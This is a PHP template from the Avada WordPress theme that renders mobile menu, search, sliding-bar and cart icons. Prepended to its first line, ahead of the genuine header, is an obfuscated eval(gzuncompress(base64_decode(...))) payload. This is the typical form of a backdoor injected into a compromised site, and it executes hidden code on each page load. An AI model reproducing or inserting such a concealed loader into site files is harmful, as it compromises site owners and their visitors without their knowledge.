<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Mobile modern menu template.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}
$c_page_id = Avada()->fusion_library->get_page_id();
$displayed_menu = get_post_meta( $c_page_id, 'pyre_displayed_menu', true );
?>
<?php if ( 'modern' === Avada()->settings->get( 'mobile_menu_design' ) && ( has_nav_menu( 'main_navigation' ) || ( $displayed_menu && '' !== $displayed_menu && 'default' !== $displayed_menu ) ) ) : ?>
	<div class="fusion-mobile-menu-icons">
		<?php // Make sure mobile menu toggle is not loaded when ubermenu is used. ?>
		<?php if ( ! function_exists( 'ubermenu_get_menu_instance_by_theme_location' ) || ( function_exists( 'ubermenu_get_menu_instance_by_theme_location' ) && ! ubermenu_get_menu_instance_by_theme_location( 'main_navigation' ) ) ) : ?>
			<a href="#" class="fusion-icon fusion-icon-bars" aria-label="<?php esc_attr_e( 'Toggle mobile menu', 'Avada' ); ?>" aria-expanded="false"></a>
		<?php endif; ?>

		<?php if ( Avada()->settings->get( 'mobile_menu_search' ) ) : ?>
			<a href="#" class="fusion-icon fusion-icon-search" aria-label="<?php esc_attr_e( 'Toggle mobile search', 'Avada' ); ?>"></a>
		<?php endif; ?>

		<?php if ( 'menu' === Avada()->settings->get( 'slidingbar_toggle_style' ) && Avada()->settings->get( 'mobile_slidingbar_widgets' ) ) : ?>
			<?php $sliding_bar_label = esc_attr__( 'Toggle Sliding Bar', 'Avada' ); ?>
			<a href="#" class="fusion-icon fusion-icon-sliding-bar" aria-label="<?php echo esc_attr( $sliding_bar_label ); ?>"></a>
		<?php endif; ?>

		<?php if ( class_exists( 'WooCommerce' ) && Avada()->settings->get( 'woocommerce_cart_link_main_nav' ) ) : ?>
			<a href="<?php echo esc_url_raw( get_permalink( get_option( 'woocommerce_cart_page_id' ) ) ); ?>" class="fusion-icon fusion-icon-shopping-cart"  aria-label="<?php esc_attr_e( 'Toggle mobile cart', 'Avada' ); ?>"></a>
		<?php endif; ?>
	</div>
	<?php
endif;

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
